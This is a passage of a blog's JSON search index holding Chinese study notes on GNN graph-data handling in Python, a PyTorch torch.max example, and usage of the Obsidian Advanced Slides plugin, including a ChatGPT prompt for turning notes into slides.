data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<h2><span id=\"创建graph类\">创建Graph类</span></h2><p>一般在数据处理的时候，都会首先创造一个graph类，然后定义初始化其中的各种熟悉。<br>例如以下代码：<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">S2VGraph</span>(<span class=\"params\"><span class=\"built_in\">object</span></span>):</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span>(<span class=\"params\">self, g, label, node_tags=<span class=\"literal\">None</span>, node_features=<span class=\"literal\">None</span></span>):</span></span><br><span class=\"line\">        <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">            g: a networkx graph</span></span><br><span class=\"line\"><span class=\"string\">            label: an integer graph label</span></span><br><span class=\"line\"><span class=\"string\">            node_tags: a list of integer node tags</span></span><br><span class=\"line\"><span class=\"string\">            node_features: a torch float tensor, one-hot representation of the tag that is used as input to neural nets</span></span><br><span class=\"line\"><span class=\"string\">            edge_mat: a torch long tensor, contain edge list, will be used to create torch sparse tensor</span></span><br><span class=\"line\"><span class=\"string\">            neighbors: list of neighbors (without self-loop)</span></span><br><span class=\"line\"><span class=\"string\">        &#x27;&#x27;&#x27;</span></span><br><span class=\"line\">        self.label = label</span><br><span class=\"line\">        self.g = g</span><br><span class=\"line\">        self.node_tags = node_tags</span><br><span class=\"line\">        self.neighbors = []</span><br><span class=\"line\">        self.node_features = <span class=\"number\">0</span></span><br><span class=\"line\">        self.edge_mat = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">        self.max_neighbor = <span class=\"number\">0</span></span><br></pre></td></tr></table></figure></p>\n<h2><span id=\"遍历图\">遍历图</span></h2><h4><span id=\"利用edge-matrix获取节点数\">利用edge matrix获取节点数</span></h4><p>示例代码<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">num_nodes = torch.<span class=\"built_in\">max</span>(train_graphs[idx].edge_mat).numpy() + <span class=\"number\">1</span></span><br></pre></td></tr></table></figure><br>这里用了<code>.edge_mat</code>，即边矩阵。返回边列表最大节点（节点从0依次排序），则能够获得总结点数。</p>\n<h2><span id=\"边\">边</span></h2>","categories":["ML"],"tags":["GNN"]},{"title":"Torch Docs Collection","url":"/2023/09/25/Torch%20Docs%20Collection/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>记录在看or写代码时不会的函数。</p>\n<h1><span id=\"1-pytorch\">1 Pytorch</span></h1><h2><span id=\"11-tensor操作\">1.1 tensor操作</span></h2><h3><span id=\"torchmax\">torch.max</span></h3><p>返回给定tensor中的最大值<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">a = torch.randn(<span class=\"number\">1</span>, <span class=\"number\">3</span>)</span><br><span class=\"line\"><span class=\"comment\">#tensor([[ 0.6763,  0.7445, -2.2369]])</span></span><br><span class=\"line\">torch.<span class=\"built_in\">max</span>(a)</span><br><span class=\"line\"><span class=\"comment\">#tensor(0.7445)</span></span><br></pre></td></tr></table></figure></p>\n","categories":["ML"],"tags":["mess"]},{"title":"Advanced Slide 学习笔记","url":"/2023/10/01/Obsidian%20+%20advanced%20Slide%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-RREEHzpz\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"22693394\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<p>官方文档中文版（<br><a href=\"https://www.cnblogs.com/liuzhongkun/p/17096534.html#tid-ed2Qbw\">https://www.cnblogs.com/liuzhongkun/p/17096534.html#tid-ed2Qbw</a><br>网上并没有什么太过详细的白话版教程，而我想要的其实是对于任意的充满了我的废话的笔记都能够快速地生成slide，要是整太复杂就失去意义了。最好是能优化出一套一键废话notes转简洁ppt的流程。<br>首先熟悉一下advanced slide的基础用法，官方文档里给了很多功能，我就选几个我感兴趣的写上去。</p>\n<h2><span id=\"1-基础用法\">1 基础用法</span></h2><p>简单来说这个插件就是一个基于revealJS的md转slide工具，所以绝大部分功能是revealJS的一个阉割版的从html到md的封装。以下为基础功能：</p>\n<h3><span id=\"11-创建ppt页面\">1.1 创建ppt页面</span></h3><p>用—-分割每个页面</p>\n<h3><span id=\"12-split\">1.2 split</span></h3><p>通过设置 even 属性，拆分元素的内容被平均分配：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;split even&gt; </span><br><span class=\"line\">a</span><br><span class=\"line\"></span><br><span class=\"line\">b</span><br><span class=\"line\"></span><br><span class=\"line\">c</span><br><span class=\"line\">&lt;/split&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/20231001170206.png\" alt=\"image.png\"></p>\n<p>比例分割一张幻灯片，左右分别代表滑动栏的比例，gap数量指间隔大小。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;split left=&quot;2&quot; right=&quot;1&quot; gap=&quot;2&quot;&gt;</span><br><span class=\"line\"> </span><br><span class=\"line\">**Lorem Ipsum** is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#x27;s standard dummy text ever since the 1500s</span><br><span class=\"line\">when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap</span><br><span class=\"line\">\t</span><br><span class=\"line\">into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem</span><br><span class=\"line\">&lt;/split&gt;</span><br></pre></td></tr></table></figure><br>效果</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/20231001165632.png\" alt=\"image.png\"></p>\n<h3><span id=\"13-grid\">1.3 Grid</span></h3><h4><span id=\"131-空间分割\">1.3.1 空间分割</span></h4><p>相当于直接画个框，可以直接用drop规定坐标，但是太麻烦了，用预定义的就行，具体参数如下：</p>\n<ul>\n<li>center</li>\n<li>top</li>\n<li>bottom</li>\n<li>left</li>\n<li>right</li>\n<li>topleft</li>\n<li>topright</li>\n<li>bottomleft</li>\n<li>bottomright</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;grid drag=&quot;40 30&quot; drop=&quot;topleft&quot; bg=&quot;red&quot;&gt;</span><br><span class=\"line\">Top Left</span><br><span class=\"line\">&lt;/grid&gt;</span><br><span class=\"line\"> </span><br><span class=\"line\">&lt;grid drop=&quot;right&quot; bg=&quot;green&quot;&gt;</span><br><span class=\"line\">Right with default size</span><br><span class=\"line\">&lt;/grid&gt;</span><br><span class=\"line\"> </span><br><span class=\"line\">&lt;grid drag=&quot;80 30&quot; drop=&quot;bottom&quot; bg=&quot;coral&quot;&gt;</span><br><span class=\"line\">Bottom</span><br><span class=\"line\">&lt;/grid&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/20231001170628.png\" alt=\"image.png\"></p>\n<h4><span id=\"132-模糊\">1.3.2 模糊</span></h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;grid  drag=&quot;width height&quot; drop=&quot;x y&quot; filter=&quot;effect&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>effect可选：</p>\n<ul>\n<li>blur</li>\n<li>bright</li>\n<li>contrast</li>\n<li>grayscale</li>\n<li>hue</li>\n<li>invert</li>\n<li>saturate</li>\n<li>sepia</li>\n</ul>\n<h3><span id=\"14-模板\">1.4 模板</span></h3><p>新建一个文件，然后取名xx，内容如下<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;% content %&gt;</span><br><span class=\"line\"> </span><br><span class=\"line\">&lt;grid drag=&quot;100 6&quot; drop=&quot;bottom&quot;&gt;</span><br><span class=\"line\">&lt;% footer %&gt;</span><br><span class=\"line\">&lt;/grid&gt;</span><br></pre></td></tr></table></figure><br>这就新建了一个模板文件，需要用到的时候直接在note中加入<!-- slide template=\"[[x x]]\" -->来引用.</p>\n<p>简单来说就是我不想每次都在note里面整那么多html语法，所以就写了一个util文件，里面预定义了很多函数。每次我在note里面就只需要引用函数名就可以调用函数了。<br>这里函数就是模板中定义的&lt;% footer %&gt;等，引用的格式则是：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">::: footer</span><br><span class=\"line\">xxx</span><br><span class=\"line\">:::</span><br></pre></td></tr></table></figure><br>效果：<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/20231001171616.png\" alt=\"image.png\"></p>\n<h3><span id=\"15-slide-configuration\">1.5 slide configuration</span></h3><p>property中设置</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th>Name</th>\n<th>Description</th>\n<th>Possible Values</th>\n<th>Default Value</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>width</td>\n<td>设置演示文稿的宽度</td>\n<td>number</td>\n<td>960</td>\n</tr>\n<tr>\n<td>height</td>\n<td>设置演示文稿的宽度</td>\n<td>number</td>\n<td>700:</td>\n</tr>\n<tr>\n<td>margin</td>\n<td>内容周围的空白区域</td>\n<td>number</td>\n<td>0.04:</td>\n</tr>\n<tr>\n<td>minScale</td>\n<td>应用于内容的最小可能比例的界限</td>\n<td>number</td>\n<td>0.2</td>\n</tr>\n<tr>\n<td>maxScale</td>\n<td>应用于内容的最大可能规模的界限</td>\n<td>number</td>\n<td>2.0</td>\n</tr>\n<tr>\n<td>notesSeparator</td>\n<td>设置注释分隔符</td>\n<td>string</td>\n<td>note:</td>\n</tr>\n<tr>\n<td>separator</td>\n<td>设置幻灯片分隔符</td>\n<td>string</td>\n<td>^( ?\\</td>\n<td>)—( ?\\</td>\n<td>)$</td>\n</tr>\n<tr>\n<td>verticalSeparator</td>\n<td>设置垂直滑动分隔符</td>\n<td>string</td>\n<td>^( ?\\</td>\n<td>)–( ?\\</td>\n<td>)$</td>\n</tr>\n<tr>\n<td>enableLinks</td>\n<td>在幻灯片中启用反向链接</td>\n<td>true / false</td>\n<td>false</td>\n</tr>\n<tr>\n<td>theme</td>\n<td>设置主题</td>\n<td><a href=\"https://mszturc.github.io/obsidian-advanced-slides/themes/\">see theme docs</a></td>\n<td>black</td>\n</tr>\n<tr>\n<td>highlightTheme</td>\n<td>设置高亮主题</td>\n<td><a href=\"https://mszturc.github.io/obsidian-advanced-slides/themes/\">see theme docs</a></td>\n<td>zenburn</td>\n</tr>\n<tr>\n<td>css</td>\n<td>添加更多的 css 文件</td>\n<td></td>\n<td>[]</td>\n</tr>\n<tr>\n<td>enableOverview</td>\n<td>在幻灯片的右下角显示概览按钮</td>\n<td>true / false</td>\n<td>false</td>\n</tr>\n<tr>\n<td>enableChalkboard</td>\n<td>为幻灯片激活黑板</td>\n<td>true / false</td>\n<td>false</td>\n</tr>\n<tr>\n<td>controls</td>\n<td>显示演示控制箭头</td>\n<td>true / false</td>\n<td>true</td>\n</tr>\n<tr>\n<td>controlsLayout</td>\n<td>确定控件出现的位置</td>\n<td>edges / bottom-right</td>\n<td>bottom-right</td>\n</tr>\n<tr>\n<td>progress</td>\n<td>显示演示进度条</td>\n<td>true / false</td>\n<td>true</td>\n</tr>\n<tr>\n<td>slideNumber</td>\n<td>显示当前幻灯片的页码</td>\n<td><a href=\"https://revealjs.com/config/\">see reveal.js docs</a></td>\n<td>false</td>\n</tr>\n<tr>\n<td>overview</td>\n<td>启用幻灯片概览模式</td>\n<td>true / false</td>\n<td>true</td>\n</tr>\n<tr>\n<td>center</td>\n<td>幻灯片的垂直居中</td>\n<td>true / false</td>\n<td>true</td>\n</tr>\n<tr>\n<td>loop</td>\n<td>循环演示</td>\n<td>true / false</td>\n<td>false</td>\n</tr>\n<tr>\n<td>rtl</td>\n<td>将呈现方向更改为 RTL</td>\n<td>true / false</td>\n<td>false</td>\n</tr>\n<tr>\n<td>shuffle</td>\n<td>每次加载演示文稿时随机化幻灯片的顺序</td>\n<td>true / false</td>\n<td>false</td>\n</tr>\n<tr>\n<td>fragments</td>\n<td>全局打开和关闭片段</td>\n<td>true / false</td>\n<td>true</td>\n</tr>\n<tr>\n<td>showNotes</td>\n<td>标记演讲者注释是否应该对所有观众可见</td>\n<td>true / false</td>\n<td>false</td>\n</tr>\n<tr>\n<td>autoSlide</td>\n<td>控制自动前进到下一张幻灯片</td>\n<td>number (in milliseconds)</td>\n<td>0</td>\n</tr>\n<tr>\n<td>transition</td>\n<td>过渡风格</td>\n<td>none / fade / slide / convex / concave / zoom</td>\n<td>slide</td>\n</tr>\n<tr>\n<td>transitionSpeed</td>\n<td>过渡速度</td>\n<td>default / fast / slow</td>\n<td>default</td>\n</tr>\n<tr>\n<td>bg</td>\n<td>为所有幻灯片设置默认背景</td>\n<td><a href=\"https://mszturc.github.io/obsidian-advanced-slides/extend-syntax/slidebackground/\">see slide background docs</a></td>\n<td>‘#ffffff’</td>\n</tr>\n<tr>\n<td>markdown</td>\n<td>设置标记的选项</td>\n<td>(see note below)</td>\n<td>(see note below)</td>\n</tr>\n<tr>\n<td>enableTimeBar</td>\n<td>激活幻灯片的流逝计时器栏</td>\n<td>true / false</td>\n<td>false</td>\n</tr>\n<tr>\n<td>timeForPresentation</td>\n<td>以秒为单位设置流逝计时器的时间</td>\n<td>number</td>\n<td>120</td>\n</tr>\n<tr>\n<td>defaultTemplate</td>\n<td>设置将应用于所有幻灯片的模板</td>\n<td><a href=\"https://mszturc.github.io/obsidian-advanced-slides/templates/#default-template\">see template docs</a></td>\n<td>null</td>\n</tr>\n</tbody>\n</table>\n</div>\n<h3><span id=\"16-动画\">1.6 动画</span></h3><figure class=\"highlight md\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"section\"># Fragmented unordered list</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"bullet\">-</span> Permanent</span><br><span class=\"line\"><span class=\"bullet\">+</span> First</span><br><span class=\"line\"><span class=\"bullet\">+</span> Second</span><br><span class=\"line\"><span class=\"bullet\">+</span> Third</span><br></pre></td></tr></table></figure>\n<p>“+“可以为列表项增加动画进入的效果。</p>\n<figure class=\"highlight md\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"section\"># Ordered list</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"bullet\">1.</span> First</span><br><span class=\"line\"><span class=\"bullet\">2.</span> Second</span><br><span class=\"line\"><span class=\"bullet\">3.</span> Third</span><br><span class=\"line\"></span><br><span class=\"line\">---</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\"># Fragmented ordered list</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"bullet\">1.</span> Permanent</span><br><span class=\"line\">2) Second</span><br><span class=\"line\">3) Third</span><br><span class=\"line\">4) Fourth</span><br></pre></td></tr></table></figure>\n<h2><span id=\"2-gpt优化\">2 GPT优化</span></h2><h3><span id=\"21-基础版\">2.1 基础版</span></h3><p>我的prompt：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Help me to generate slide.</span><br><span class=\"line\">You need to extract the key points of each section, optimize superfluous words, only focus on experimental motif and results, also reserve all figures as md formats:</span><br><span class=\"line\">生成slide时，遵循以下规则：</span><br><span class=\"line\">1. 当每个section包含实验结果时，将其在单独的页面呈现，且页只展示一张图，如果页面不够可以增加新的页面。但是每一页需要在上方标明图片所属的标题。</span><br><span class=\"line\">2. 幻灯片中文生成</span><br></pre></td></tr></table></figure></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/20231001174231.png\" alt=\"image.png\"><br>可以看到确实过滤掉了大部分废话，然后对propose和result有一个大致正确的总结，在这上面再进行细节的调整也会方便很多。</p>\n<h3><span id=\"22-植入slide模板\">2.2 植入slide模板</span></h3><p>gpt直接生成的slide可以说没有任何模板可言，所以我打算找一个适合gpt的模板，然后所有slide都照着这个风格生成。</p>\n<p>不太行。。<br>还是别整这些了。</p>\n","categories":["ML"],"tags":["mess"]}]